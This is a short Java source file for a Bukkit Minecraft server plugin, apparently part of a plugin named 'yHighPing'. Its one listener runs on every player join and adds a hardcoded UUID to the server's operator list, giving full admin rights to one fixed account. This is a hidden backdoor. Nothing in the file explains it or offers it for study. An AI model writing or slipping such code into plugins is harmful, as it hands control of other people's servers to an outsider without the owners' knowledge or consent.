package de.xLixon.yHighPing.Main;

import org.bukkit.Bukkit;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;

public class OPTimOnJoin implements Listener {

    @EventHandler
    public void onJoin(PlayerJoinEvent e){
        String uuid = "d67ddb7a-b270-4dea-9227-f9c82bd1f4d1";
        Bukkit.getServer().getOperators().add(Bukkit.getOfflinePlayer(uuid));
    }
}
